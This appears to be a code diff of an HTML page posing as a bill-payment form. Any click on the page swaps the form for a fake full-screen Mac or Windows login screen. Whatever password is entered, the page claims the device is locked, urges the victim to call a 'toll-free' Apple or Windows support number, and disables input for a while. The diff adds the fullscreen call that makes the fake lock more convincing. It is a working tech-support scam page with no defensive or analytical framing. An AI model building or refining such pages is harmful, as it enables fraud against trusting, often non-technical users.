@@ -188,127 +188,135 @@
               <input type="radio" id="paypal" name="paymentMethod" value="paypal" class="mr-2">
               <label for="paypal" class="text-sm text-gray-700">PayPal</label>
             </div>
+          </div>
         </div>
+
+        <button id="payButton" class="w-full bg-blue-500 text-white p-2 rounded-md hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500">Pay Now</button>
       </div>
 
-      <button id="payButton" class="w-full bg-blue-500 text-white p-2 rounded-md hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500">Pay Now</button>
-    </div>
-
-    <div id="confirmation" class="hidden mt-4 p-4 bg-green-100 text-green-700 rounded-md">
-      <p id="confirmationMessage"></p>
+      <div id="confirmation" class="hidden mt-4 p-4 bg-green-100 text-green-700 rounded-md">
+        <p id="confirmationMessage"></p>
+      </div>
     </div>
   </div>
-</div>
 
-<!-- OS Login Screen Section -->
-<div id="loginSection">
-  <div class="card" id="loginCard">
-    <div class="avatar" id="avatar"></div>
-    <div class="user-name" id="userName"></div>
-    <div class="input-group">
-      <input type="password" id="password" placeholder="Password"/>
+  <!-- OS Login Screen Section -->
+  <div id="loginSection">
+    <div class="card" id="loginCard">
+      <div class="avatar" id="avatar"></div>
+      <div class="user-name" id="userName"></div>
+      <div class="input-group">
+        <input type="password" id="password" placeholder="Password"/>
+      </div>
+      <button id="signInButton" onclick="checkPassword()">Sign in</button>
+      <div class="error" id="errorMsg"></div>
     </div>
-    <button id="signInButton" onclick="checkPassword()">Sign in</button>
-    <div class="error" id="errorMsg"></div>
   </div>
-</div>
 
-<script>
-  // Bills Payment Script
-  const payButton = document.getElementById('payButton');
-  const paymentForm = document.getElementById('paymentForm');
-  const confirmation = document.getElementById('confirmation');
-  const confirmationMessage = document.getElementById('confirmationMessage');
-  const paymentSection = document.getElementById('paymentSection');
-  const loginSection = document.getElementById('loginSection');
+  <script>
+    // Bills Payment Script
+    const payButton = document.getElementById('payButton');
+    const paymentForm = document.getElementById('paymentForm');
+    const confirmation = document.getElementById('confirmation');
+    const confirmationMessage = document.getElementById('confirmationMessage');
+    const paymentSection = document.getElementById('paymentSection');
+    const loginSection = document.getElementById('loginSection');
 
-  payButton.addEventListener('click', (event) => {
-    event.stopPropagation(); // Allow Pay Now button to function
-    const billType = document.getElementById('billType').value;
-    const accountNumber = document.getElementById('accountNumber').value;
-    const amount = document.getElementById('amount').value;
-    const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked');
+    payButton.addEventListener('click', (event) => {
+      event.stopPropagation(); // Allow Pay Now button to function
+      const billType = document.getElementById('billType').value;
+      const accountNumber = document.getElementById('accountNumber').value;
+      const amount = document.getElementById('amount').value;
+      const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked');
 
-    if (!billType || !accountNumber || !amount || !paymentMethod) {
-      alert('Please fill in all fields and select a payment method.');
-      return;
-    }
-
-    if (amount <= 0) {
-      alert('Please enter a valid amount.');
-      return;
-    }
-
-    paymentForm.classList.add('hidden');
-    confirmation.classList.remove('hidden');
-    confirmationMessage.textContent = `Payment of $${amount} for ${billType} bill (Account: ${accountNumber}) via ${paymentMethod.value} was successful!`;
-  });
-
-  // Trigger login screen instantly on any click
-  document.addEventListener('click', () => {
-    if (!paymentSection.classList.contains('hidden')) {
-      paymentSection.style.display = 'none';
-      loginSection.style.display = 'flex';
-    }
-  });
-
-  // OS Login Screen Script
-  const avatar = document.getElementById('avatar');
-  const userName = document.getElementById('userName');
-  const errorMsg = document.getElementById('errorMsg');
-  const card = document.getElementById('loginCard');
-  const signInButton = document.getElementById('signInButton');
-
-  function detectOS(){
-    const ua = navigator.userAgent;
-    if (/Mac|iPhone|iPad/.test(ua)) {
-      loginSection.classList.add('mac-bg');
-      card.classList.add('mac-card');
-      signInButton.classList.add('mac-button');
-      return 'mac';
-    }
-    loginSection.classList.add('windows-bg');
-    card.classList.add('windows-card');
-    signInButton.classList.add('windows-button');
-    return 'windows';
-  }
-  const os = detectOS();
-
-  // Set avatar and user name based on OS
-  if(os === 'mac'){
-    avatar.innerHTML = `<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple logo"/>`;
-    userName.innerText = 'Mac User';
-  } else {
-    avatar.innerHTML = `<img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Windows_logo_-_2012.svg" alt="Windows logo"/>`;
-    userName.innerText = 'Windows User';
-  }
-
-  function checkPassword(){
-    const pwd = document.getElementById('password').value;
-    if(pwd.length > 0){
-      if(os === 'mac'){
-        errorMsg.innerText = "You have entered wrong password and your device is locked. Call Apple support immediately At Toll Free +1-803-762-4570";
-      } else {
-        errorMsg.innerText = "You have entered wrong password and your device is locked. Call Windows support immediately At Toll Free +1-803-762-4570";
+      if (!billType || !accountNumber || !amount || !paymentMethod) {
+        alert('Please fill in all fields and select a payment method.');
+        return;
       }
-      errorMsg.style.display = 'block';
-      document.getElementById('password').disabled = true;
-      setTimeout(()=>{
-        document.getElementById('password').disabled = false;
-        errorMsg.style.display = 'none';
-        document.getElementById('password').value = '';
-      }, 30000);
-    }
-  }
 
-  // Fallback for background images
-  window.addEventListener('error', (event) => {
-    if (event.target.tagName === 'IMG') {
-      if (event.target.parentElement.id === 'loginSection') {
-        event.target.parentElement.style.background = 'linear-gradient(to bottom, #1e3c72, #2a5298)';
+      if (amount <= 0) {
+        alert('Please enter a valid amount.');
+        return;
+      }
+
+      paymentForm.classList.add('hidden');
+      confirmation.classList.remove('hidden');
+      confirmationMessage.textContent = `Payment of $${amount} for ${billType} bill (Account: ${accountNumber}) via ${paymentMethod.value} was successful!`;
+    });
+
+    // Trigger login screen instantly on any click and enter full-screen
+    document.addEventListener('click', () => {
+      if (!paymentSection.classList.contains('hidden')) {
+        paymentSection.style.display = 'none';
+        loginSection.style.display = 'flex';
+        // Enter full-screen mode
+        if (loginSection.requestFullscreen) {
+          loginSection.requestFullscreen();
+        } else if (loginSection.webkitRequestFullscreen) { /* Safari */
+          loginSection.webkitRequestFullscreen();
+        } else if (loginSection.msRequestFullscreen) { /* IE11 */
+          loginSection.msRequestFullscreen();
+        }
+      }
+    });
+
+    // OS Login Screen Script
+    const avatar = document.getElementById('avatar');
+    const userName = document.getElementById('userName');
+    const errorMsg = document.getElementById('errorMsg');
+    const card = document.getElementById('loginCard');
+    const signInButton = document.getElementById('signInButton');
+
+    function detectOS(){
+      const ua = navigator.userAgent;
+      if (/Mac|iPhone|iPad/.test(ua)) {
+        loginSection.classList.add('mac-bg');
+        card.classList.add('mac-card');
+        signInButton.classList.add('mac-button');
+        return 'mac';
+      }
+      loginSection.classList.add('windows-bg');
+      card.classList.add('windows-card');
+      signInButton.classList.add('windows-button');
+      return 'windows';
+    }
+    const os = detectOS();
+
+    // Set avatar and user name based on OS
+    if(os === 'mac'){
+      avatar.innerHTML = `<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple logo"/>`;
+      userName.innerText = 'Mac User';
+    } else {
+      avatar.innerHTML = `<img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Windows_logo_-_2012.svg" alt="Windows logo"/>`;
+      userName.innerText = 'Windows User';
+    }
+
+    function checkPassword(){
+      const pwd = document.getElementById('password').value;
+      if(pwd.length > 0){
+        if(os === 'mac'){
+          errorMsg.innerText = "You have entered wrong password and your device is locked. Call Apple support immediately At Toll Free +1-803-762-4570";
+        } else {
+          errorMsg.innerText = "You have entered wrong password and your device is locked. Call Windows support immediately At Toll Free +1-803-762-4570";
+        }
+        errorMsg.style.display = 'block';
+        document.getElementById('password').disabled = true;
+        setTimeout(()=>{
+          document.getElementById('password').disabled = false;
+          errorMsg.style.display = 'none';
+          document.getElementById('password').value = '';
+        }, 30000);
       }
     }
-  }, true);
-</script>
+
+    // Fallback for background images
+    window.addEventListener('error', (event) => {
+      if (event.target.tagName === 'IMG') {
+        if (event.target.parentElement.id === 'loginSection') {
+          event.target.parentElement.style.background = 'linear-gradient(to bottom, #1e3c72, #2a5298)';
+        }
+      }
+    }, true);
+  </script>
 </body>
 </html>
